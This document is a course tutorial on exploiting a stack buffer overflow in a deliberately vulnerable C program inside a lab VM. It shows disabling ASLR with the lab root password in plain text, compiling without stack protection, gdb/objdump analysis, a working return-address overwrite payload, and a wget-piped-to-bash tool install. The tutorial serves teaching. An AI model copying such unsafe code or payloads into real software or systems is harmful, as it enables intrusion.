# Example - Stack Exploitation  (from week 7)

This example works through how to exploit a buffer overflow vulnerability in a C program.

## Buffer Overflow Vulnerability

A buffer overflow vulnerability occurs when a program writes more data to a buffer than it can hold. This can lead to overwriting adjacent memory locations, which can be exploited to execute arbitrary code.

Lets get started by creating a simple C program with a buffer overflow vulnerability.

## Creating a C Program with a Buffer Overflow Vulnerability

Before we get started make sure that the ASLR (Address Spae Layout Randomisation) is disabled on your machine.

ASLR randomizes the memory layout of a program, making it harder to exploit vulnerabilities. Disabling ASLR makes it easier to demonstrate the buffer overflow vulnerability.

### Disabling ASLR

First check `ASLR` status by running the following command in the terminal:

```bash
cat /proc/sys/kernel/randomize_va_space
```

output:

```bash
[cyber@cyberbox ~]$ cat /proc/sys/kernel/randomize_va_space
2
[cyber@cyberbox ~]$
```

The possible values are:

* 0 – No randomization. Everything is static.
* 1 – Conservative randomization. Shared libraries, stack, mmap(), VDSO and heap are randomized.
* 2 – Full randomization. In addition to elements listed in the previous point, memory managed through brk() is also randomized.

---

The output is 2, which means ASLR is enabled. We need to disable it by running the command below as the root user:

First, make sure you are in super user mode. In the terminal type `su` and enter the password `cyberr00t`:

```bash
$ su
Password: cyberr00t
```

Then run the following command:

```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

```

followed by

```bash
exit
```

output:

```bash
[cyber@cyberbox ~]$ su
Password: 
[root@cyberbox cyber]# echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
0
[root@cyberbox cyber]# exit
exit
[cyber@cyberbox ~]$
```

Next we create a simple C program with a buffer overflow vulnerability.


### Exploiting a Buffer Overflow Vulnerability

Below is an example to exploit a buffer overflow vulnerability in a C program, for the file `Vuln.c`.

#### `Vuln.c`

```c
#include <string.h>
#include <stdio.h>
#include <stdlib.h>



void function1(char* buffer1)
{

	char buffer[16];
	strcpy(buffer, buffer1);
	printf("Your input string is copied in the buffer \n");
	return; 

}


void function2(void)
{

	printf("This function never gets called \n");
	exit(-1);
	

}


int main(int argc, char* argv[])
{
   char some_buffer[60];	
	function1(argv[1]);

}
```

This code has a buffer overflow vulnerability. 

* The function `function1` takes a string as an argument and copies it into a buffer of size 16. 
* The function `function2` is never called. 
* The main function calls `function1` with the first command line argument. 
* The goal is to exploit the buffer overflow vulnerability to call `function2` instead of `function1`. 

To exploit this vulnerability, we need to overflow the buffer in `function1` to overwrite the return address of the function. 

To do this we first need to compile the code, then run it with a command line argument that will overflow the buffer.

### Compile the code in 32-bit mode - in a folder containing the `Vuln.c` file:

```bash
gcc Vuln.c -o vulnn -g -m32 -O0 -fno-stack-protector -z execstack  
```

This compile instrcuction consists of the following flags:

* gcc: the compiler.
* `-o vulnn`: specifies the output file name.
* `-g`: includes debugging information in the executable.
* `-m32`: compiles the code for a 32-bit system.
* -fnostack-protector: disables stack protection mechanisms.
* `-z execstack`: marks the stack as executable.




---

### Debugging - just after the buffer is assigned

As an alternative to `objdump` we can use `gdb` to investigate the stack at the point just after the buffer is assigned in the `function1` function. 

* Make sure you are in the same folder as the `vulnn` executable:

#### Installing `gef` - GDB Enhanced Features

Before running `gdb` - you can install gdb enhanced features `gef` to make the gdb output more readable. From the command line run the following command:

```bash
bash -c "$(wget https://gef.blah.cat/sh -O -)"
```
Next, start `gdb` (`gef`) with the following command:

```bash
gdb -q ./vulnn
```

This command will start the gdb debugger and load the `vulnn` executable. The `-q` flag is used to start gdb in quiet mode i.e. without displaying the welcome message.

output:

```bash
[cyber@cyberbox week7_stackexploitation]$ gdb -q ./vulnn
GEF for linux ready, type `gef' to start, `gef config' to configure
93 commands loaded and 5 functions added for GDB Fedora Linux 13.2-3.fc38 in 0.00ms using Python engine 3.11
Reading symbols from ./vulnn...
gef➤  
```

### Setting a breakpoint

Setting a breakpoint allows us to pause the program at a specific point to inspect the state of the program (stack, registers, etc.).

* For this example - we set a breakpoint in such a way that we can monitor the state of the stack just after the buffer assignment in funciton 1.

* This means we need to enable a break inside the debugger at `line 12` in the `Vuln.c` file:

```bash
gef➤  break 12
Breakpoint 1 at 0x80491ae: file Vuln.c, line 12.
```

### Exposing the stack just after the buffer is assigned

Run the program with an input parameter - while inside the debugger. 

* Run the program with an input parameter of 24 consecutive `A`'s as follows:

```bash
#  24 A's i.e. 24 bytes
run "AAAAAAAAAAAAAAAAAAAAAAAA"
```

The stack output is as follows:

```bash
0xffffcf40│+0x0000: "AAAAAAAAAAAAAAAAAAAAAAAA"	 ← $esp
0xffffcf44│+0x0004: "AAAAAAAAAAAAAAAAAAAA"
0xffffcf48│+0x0008: "AAAAAAAAAAAAAAAA"
0xffffcf4c│+0x000c: "AAAAAAAAAAAA"
0xffffcf50│+0x0010: "AAAAAAAA"
0xffffcf54│+0x0014: "AAAA"
0xffffcf58│+0x0018: 0xffffcf00  →  0x00000000	 ← $ebp
0xffffcf5c│+0x001c: 0x08049205  →  <main+0024> add esp, 0x10

```

The above output follows the pattern:

`LOCATION | OFFSET : VALUE`

* The stack is shown in the output above. It is read from the bottom to the top.

* The stack grows downwards, so the top of the stack is at the bottom of the output (the highest memory address).

	* The stack pointer (`$esp`) is at `0xffffcf40`
	* The base pointer (`$ebp`) is at `0xffffcf58`
	* The return address is at `0xffffcf5c`, which is the address of the next instruction.

As we progress from the top to the bottom of the output we see that:

* Initially we just have the parameter string
* Then as we progress to the next address location - the parameter string shrinks in size by the amount of the parameter that has just been absorbed into the previouse memory location.
* i.e. each memory location absorbs the next 4 bytes of the remaing payload - until all of the payload has been absorbed into memory.
* In this exap=mle the full payload is absorbed up to the location of the base pointer (but excluding the baes pointer).
* So this measn that the payload is not overwriting the base pointer or the resturn address.

This means that in order for us to implement the exploit we have to reconstruct/extend the tail end of the payload - to overwrite the base pointer (i.e. with paddding) and finally overwrite the return address with the return address of function2 .

So in the above example the full 24 bytes of the payload (24 letter A's) are absorbed at each of the following addresses:

* location 0xffffcf40 absorbs the first 4 bytes of the 24 byte payload,
* location 0xffffcf44 absorbs the next 4 bytes of the remaining 20 byte payload,
* location 0xffffcf48 absorbs the next 4 bytes of the remaining 16 byte payload,
* location 0xffffcf4c absorbs the next 4 bytes of the remaining 12 byte payload,
* location 0xffffcf50 absorbs the next 4 bytes of the remaining 8 byte payload,
* location 0xffffcf54 absorbs the last 4 bytes of the remaining 4 byte payload.

 From this we see that the full payload did not reach the location `0xffffcf58` (i.e. the base pointer) or location `0xffffcf5c` (i.e. the return address). 
 
 So we need to extend the payload accordingly, to overwrite the base pointer and the return address.

Note that: 

> `The return address is the address of the next instruction to be executed after the function returns.`




## Exploiting the buffer overflow vulnerability

The next step is to rebuild the payload and run the program - to enable the overwriting of the base pointer and the return address for function1. 

Using the command below - we can find the return address of function2: 

```bash
objdump -M intel -d vulnn 

# Or alternatively : objdump -M intel -d vulnn | grep function2
```

From the output, we see that the address of function2 is: `0x080491c1` - which needs to be represented in `little endian`  format (`see notes below`) as follows: `0xc1\x91\x04\x08`.

We are now ready to overwite the return address of function1, with the little endian version of the return  address of function 2. 

### Constructing the payload

Before adding the return address component to the payload - we need to add some padding to the payload to overwrite the base pointer. The amount of padding required is calculated as follows: 

* The base pointer is at location `0xffffcf58` - which is 24 bytes from the start of the payload.
* The return address is at location `0xffffcf5c` - which is 28 bytes from the start of the payload.
* So we need to add 4 bytes of padding to the payload to overwrite the base pointer.
* We choose to use the letter `B` as padding - which in hex is `0x42`.

So the adjusted  payload would be as follows: 

```bash
'AAAAAAAAAAAAAAAAAAAAAAAABBBB\xc1\x91\x04\x08'
```

### Running the exploit

Adding this payload to the program and running it we can test the exploit to see if function2 is called. 

```bash
[cyber@cyberbox week7_stackexploitation]$ ./vulnn "$(echo -en 'AAAAAAAAAAAAAAAAAAAAAAAABBBB\xc1\x91\x04\x08')"

Your input string is copied in the buffer 
This function never gets called 

[cyber@cyberbox week7_stackexploitation]$
```

This is the final exploit!

 - which is succesfull as the output shows that  `function2` has been called `(given that the screen output displays a message from function2)`.

---

### A note on endianness

* `Little-endian` is a format for storing binary data in which the least significant byte (the "little end") is stored first, and the most significant byte is stored last.

* `Big-endian` is the opposite format, where the most significant byte is stored first and the least significant byte is stored last.

In the context of buffer overflows and exploits, it's important to understand the endianness of the target system to correctly format the payload.

### A note on finding the address of function2

We got the address of function2 by running the following command:

```bash
objdump -M intel -d vulnn 

# Or alternatively : objdump -M intel -d vulnn | grep function2
```

output:

```bash
080491c1 <function2>:
 80491c1:	55                   	push   ebp
 80491c2:	89 e5                	mov    ebp,esp
 80491c4:	83 ec 08             	sub    esp,0x8
 80491c7:	83 ec 0c             	sub    esp,0xc
 80491ca:	68 38 a0 04 08       	push   0x804a038
 80491cf:	e8 8c fe ff ff       	call   8049060 <puts@plt>
 80491d4:	83 c4 10             	add    esp,0x10
 80491d7:	83 ec 0c             	sub    esp,0xc
 80491da:	6a ff                	push   0xffffffff
 80491dc:	e8 8f fe ff ff       	call   8049070 <exit@plt>
```

So from the above we cen see that the address of function2 is `0x080491c1` - which is `0xc1\x91\x04\x08` in little endian format. 

This is the final part of the payload that will overwrite the return address in the call stack for the function1 function - to be the address of function2.

Recall:

`The return address of funciton 1 is the address of the next instruction to be executed after function1 returns to the calling function (which in this case is the main function).`

Stated slightly differently - when function1 tries to return, it will jump to function2 instead of returning to the main function - which is the intended exploit.




### A note on inspecting the stack at the current breakpoint using an alternative approach

To inspect the stack at the current point in time - i.e. just after the buffer is assigned - we can use the following command:

```bash
 x /40xw $esp
 ```

 When using this command in gdb, you're asking gdb to examine memory. 
 
 Here's a breakdown of what each part of the command means:


```bash
x: This is the gdb command to examine memory.

/40xw: This specifies how much memory to examine and in what format. In this case:

40: The number of units to display.

x: Display the memory in hexadecimal format.

w: Each unit is a word (4 bytes on most systems).

$esp: This is the register that points to the current stack pointer in x86 architecture.
```

So, `x /40xw $esp` will:

* display 40 words (160 bytes) of memory - starting from the address stored in the $esp register, in hexadecimal format.

#### Visualising the stack at the current breakpoint

Running the above command we get:

```bash
gef➤   x /40xw $esp
0xffffcf40:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcf50:	0x41414141	0x41414141	0xffffcf00	0x08049205
0xffffcf60:	0xffffd293	0xffffd23b	0x00000002	0x0000001c
0xffffcf70:	0xf7ffcfd4	0x0000002c	0x00000000	0xffffdfbd
0xffffcf80:	0xf7fc7580	0xf7fc7000	0x00000000	0x00000000
0xffffcf90:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcfa0:	0xffffffff	0xf7dce190	0xf7fc1390	0x00000000
0xffffcfb0:	0x00000000	0xffffcfd0	0x00000000	0xf7de0969
0xffffcfc0:	0x00000000	0x00000000	0xf7df97bd	0xf7de0969
0xffffcfd0:	0x00000002	0xffffd084	0xffffd090	0xffffcff0
gef➤ 
```

The output shows the memory contents starting from the address stored in the `$esp` register. Each line displays 4 words (16 bytes) of memory in hexadecimal format.

* The first line shows the memory contents at locations `0xffffcf40` through to `0xffffcf50`. Each of the 4 locations contains the value `0x41414141`, which corresponds to the hex representation of the letters 'AAAA'.

* The next line shows the memory contents at address `0xffffcf50` to `0xffffcf60`. `0xffffcf00` represents the loation of the base pointer (`$ebp`), and `0x08049205` the location of the return address.

The subsequent lines show more memory contents, including addresses, values, and pointers.

### A note on objdump

We take a closer look at what is going on in memory using objdump:

```bash
objdump -M intel -d vulnn
```

This instruction consists of the following flags:

* `-M intel`: specifies the Intel syntax for the assembly code.
* `-d vulnn`: disassembles the executable file `vulnn`.

This command will show the assembly code of the compiled program. We are interested in the `function1` function, which is where the buffer overflow vulnerability is. 

Here is a snippet of the disassembled code:

```bash
vulnn:     file format elf32-i386

08049196 <function1>:
 8049196:	55                   	push   ebp
 8049197:	89 e5                	mov    ebp,esp
 8049199:	83 ec 18             	sub    esp,0x18
 804919c:	83 ec 08             	sub    esp,0x8
 804919f:	ff 75 08             	push   DWORD PTR [ebp+0x8]
 80491a2:	8d 45 e8             	lea    eax,[ebp-0x18]
 80491a5:	50                   	push   eax
 80491a6:	e8 a5 fe ff ff       	call   8049050 <strcpy@plt>
 80491ab:	83 c4 10             	add    esp,0x10
 80491ae:	83 ec 0c             	sub    esp,0xc
 80491b1:	68 0c a0 04 08       	push   0x804a00c
 80491b6:	e8 a5 fe ff ff       	call   8049060 <puts@plt>
 80491bb:	83 c4 10             	add    esp,0x10
 80491be:	90                   	nop
 80491bf:	c9                   	leave
 80491c0:	c3                   	ret

080491c1 <function2>:
 80491c1:	55                   	push   ebp
 80491c2:	89 e5                	mov    ebp,esp
 80491c4:	83 ec 08             	sub    esp,0x8
 80491c7:	83 ec 0c             	sub    esp,0xc
 80491ca:	68 38 a0 04 08       	push   0x804a038
 80491cf:	e8 8c fe ff ff       	call   8049060 <puts@plt>
 80491d4:	83 c4 10             	add    esp,0x10
 80491d7:	83 ec 0c             	sub    esp,0xc
 80491da:	6a ff                	push   0xffffffff
 80491dc:	e8 8f fe ff ff       	call   8049070 <exit@plt>

080491e1 <main>:
 80491e1:	8d 4c 24 04          	lea    ecx,[esp+0x4]
 80491e5:	83 e4 f0             	and    esp,0xfffffff0
 80491e8:	ff 71 fc             	push   DWORD PTR [ecx-0x4]
 80491eb:	55                   	push   ebp
 80491ec:	89 e5                	mov    ebp,esp
 80491ee:	51                   	push   ecx
 80491ef:	83 ec 44             	sub    esp,0x44
 80491f2:	89 c8                	mov    eax,ecx
 80491f4:	8b 40 04             	mov    eax,DWORD PTR [eax+0x4]
 80491f7:	83 c0 04             	add    eax,0x4
 80491fa:	8b 00                	mov    eax,DWORD PTR [eax]
 80491fc:	83 ec 0c             	sub    esp,0xc
 80491ff:	50                   	push   eax
 8049200:	e8 91 ff ff ff       	call   8049196 <function1>
 8049205:	83 c4 10             	add    esp,0x10
 8049208:	b8 00 00 00 00       	mov    eax,0x0
 804920d:	8b 4d fc             	mov    ecx,DWORD PTR [ebp-0x4]
 8049210:	c9                   	leave
 8049211:	8d 61 fc             	lea    esp,[ecx-0x4]
 8049214:	c3                   	ret


[cyber@cyberbox week7_stackexploitation]$ 
```

---

### A note on ASCII and HEX representations of letters

Recall that every letter has an ascii representation which in turn has a hex representation.

For example, the letter `A` has the following representations:

* `ascii` 	: 		`65`
* `hex`   	: 		`41`
* `binary`  :  `01000001`

The letter `A` takes up one byte (8 bits) of memory.

So the letters:

* `AA` would take up two bytes of memory 
* `AAAA` would take up four bytes of memory - which in `hex` would be `0x41 0x41 0x41 0x41` or alternatively represnted as: `0x41414141`.

`What is the difference between these two hex representatins: "0x41 0x41 0x41 0x41" and "0x41414141"?`

* The difference between "0x41 0x41 0x41 0x41" and "0x41414141" lies in how the hexadecimal values are grouped and interpreted:

	* "0x41 0x41 0x41 0x41" represents four separate bytes, each with the hexadecimal value 0x41. 

	* "0x41414141" represents a single 32-bit value (or four bytes) in hexadecimal -corresponds to a character string of four A's: `"AAAA"`.
	* When interpreted as four separate bytes, it is equivalent to the sequence "0x41 0x41 0x41 0x41" - corresponds to four `A` characters.

In essence, both representations are equivalent in terms of the actual data they represent, but they are formatted differently. 

The first format shows each byte separately, while the second format combines them into a single 32-bit value.

The char buffer is allocated at 16 bytes - which from a letter perspective is 16 characters. 